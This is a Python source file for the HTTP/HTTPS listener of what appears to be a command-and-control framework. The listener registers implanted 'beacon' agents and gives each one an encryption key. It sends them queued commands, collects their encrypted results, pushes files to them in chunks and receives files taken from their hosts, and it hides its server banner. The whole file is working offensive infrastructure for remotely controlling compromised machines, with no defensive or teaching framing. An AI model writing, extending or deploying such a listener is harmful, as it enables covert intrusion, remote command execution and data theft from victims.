import sys
import threading

from io import BytesIO
from core.logger import *
from core.crypto import *
from random import choice
from base64 import b64encode
from datetime import datetime
from string import ascii_letters
from multiprocessing import Process
from os import path, getcwd
from flask import Flask, render_template, request, send_from_directory

class HTTP_listener:

    def __init__(self, l_type, name, ip, port, stash, debug=False):
        self.name = name
        self.ip = ip
        self.port = port
        self.l_type = l_type
        self.debug = debug

        self.stash = stash
        self.downloadPath = path.join(getcwd(), 'downloads')
        self.uploadPath = path.join(getcwd(), 'uploads')
        self.certPath = path.join(getcwd(), 'certs', 'cert.pem')
        self.privkeyPath = path.join(getcwd(), 'certs', 'key.pem')

        self.u_files = {}
        self.d_files = {}

        key = self.stash.get_key(name)
        if key:
            self.key = key[0][0]
        else:
            self.key = key_init()
            self.stash.register_list(name, l_type, self.key, ip, port)

        html_fold = path.join(getcwd(), 'core' ,'html')
        self.app = Flask(__name__, template_folder=html_fold)

        self.running = True

        @self.app.route('/', methods=['GET'])
        def index():
            return ('Hello there!')

        @self.app.route('/beacon/register', methods=['POST'])
        def register():
            beacon_name = ''.join(choice(ascii_letters) for i in range(10))
            beacon_ip = request.remote_addr

            beacon_hostname = request.form.get('name')
            beacon_hostname = DECRYPT(beacon_hostname, self.key)
            beacon_type = request.form.get('type')
            beacon_type = DECRYPT(beacon_type, self.key)
            
            # success(f'New undercover agent {beacon_name}.')
            agent_key = key_init()
            # fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, self.key, True)
            fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, agent_key, True)
            self.stash.sql_stash( '''INSERT INTO agents( agent_name, \
                                                         listener_name, \
                                                         remote_ip, \
                                                         hostname, \
                                                         beacon_type, \
                                                         enc_key, \
                                                         alive ) VALUES( ?, ?, ?, ?, ?, ?, ? )''', fields )

            send_it = ENCRYPT(f'VALID {beacon_name} {agent_key}', self.key)
            return (send_it, 200)

        @self.app.route('/tasks/<name>', methods=['GET'])
        def getinTask(name):
            task = self.stash.get_task(name)
            if task:
                key = self.stash.get_agent_key(agent=name)
                com_code = task[0][0]
                enc_comm = task[0][1]
                send_it = ENCRYPT(f'VALID {com_code} {enc_comm}', key)
                self.stash.del_commands(com_code)
                return (send_it, 200)
            else:
                # return (render_template(f'404.html', title = '404'), 404)
                return ('', 204)
        
        @self.app.route('/results/<code>', methods=['POST'])
        def ret_res(code):
            if self.stash.check_code(code):
                enc_result = request.form.get('result')
                if enc_result:
                    key = self.stash.get_agent_key(task=code)
                    result = DECRYPT(enc_result, key)
                else:
                    result = 'NA'
                self.stash.sql_stash( 'UPDATE commands_history SET output = ? WHERE command_code = ? ; ', (result, code) )
                if 'VALID agent renamed to ' in result:
                    agent_name = result.split()[-1]
                    old_name = self.stash.get_agent_from_comm(code)
                    if old_name:
                        old_name_s = old_name[0][0]
                        self.stash.set_new_name(agent_name, old_name_s)
                    else:
                        error('Agent to rename not found.')
                return ('', 204)
            else:
                error(f'Command Code {code} not found!')
                return (render_template(f'404.html', title = '404'), 404)

        # user command input will put the file here with user choosen name
        @self.app.route('/upload/<file>', methods=['POST'])
        def upload(file):
            file_to_split = path.join(self.uploadPath, file)
            
            name = request.form.get('name')
            enc_part = request.form.get('part')
            
            key = self.stash.get_agent_key(agent=name)
            part = DECRYPT(enc_part, key).replace('VALID ','')
            
            ## optimise this bloody waste of resources
            if path.isfile(file_to_split):
                # return (send_from_directory(self.uploadPath, file, as_attachment=True), 200)
                # ## new download function
                with open(file_to_split,'rb') as rb:
                    file_bin = rb.read()
                file_bin_arr = [file_bin[i:i+200] for i in range(0, len(file_bin), 200)]
                # file_bin_arr.append(b'xxxDONExxx')
                file_b64_arr = [b64encode(x) for x in file_bin_arr]

                if part == 'init':
                    send_it = ENCRYPT(f'VALID {len(file_b64_arr)}', key)
                else:
                    send_it = ENCRYPT(f'VALID {file_b64_arr[int(part)].decode()}', key)

                return (send_it, 200)

            else:
                return (render_template(f'404.html', title = '404'), 404)

        @self.app.route('/downloads/<file>', methods=['POST'])
        def download(file):
            # info = "$init"
            # name = "$name"
            # chunk = "$enc_len"
            name = request.form.get('name')
            enc_info = request.form.get('info')
            enc_chunk = request.form.get('chunk')
            
            key = self.stash.get_agent_key(agent=name)
            info = DECRYPT(enc_info,key).replace('VALID ','')
            chunk = DECRYPT(enc_chunk,key).replace('VALID ','')
            part,code = info.split()

            if part == 'init':
                file_fpath = path.join(self.downloadPath,f'{datetime.now().strftime("%d%m%y-%H%M%S.%s")}_{file}')
                while (path.isfile(file_fpath)):
                    # what are the odds right?? xD
                    file_fpath = path.join(self.downloadPath,f'{datetime.now().strftime("%d%m%y-%H%M%S.%s")}_{file}')

                open(file_fpath,'w+').close()
                self.stash.set_file(name, code, file, file_fpath, 'download')

                ## create file unique ID, check if it exists already, encrypt it and send it
                return ('', 200)
            else:
                self.stash.get_fileinfo(name, code)

            return ('', 204)

        @self.app.errorhandler(404)
        def page_not_found(error):
            return (render_template(f'404.html', title = '404'), 404)

    def run(self):
        # to fix (debug False and logger True)
        self.app.logger.disabled = not self.debug
        if self.l_type == 'HTTPS':
            self.app.run(port=self.port, host=self.ip, ssl_context=(self.certPath, self.privkeyPath), debug=False)
        else:
            self.app.run(port=self.port, host=self.ip, debug=False)

    def start(self):
        self.server = Process(name = self.name, target=self.run, args = (), daemon = True)

        ## no server banner
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        self.server.start()
        self.running = True

    def stop(self):
        self.server.terminate()
        self.server = None
        # self.daemon = None
        self.running = False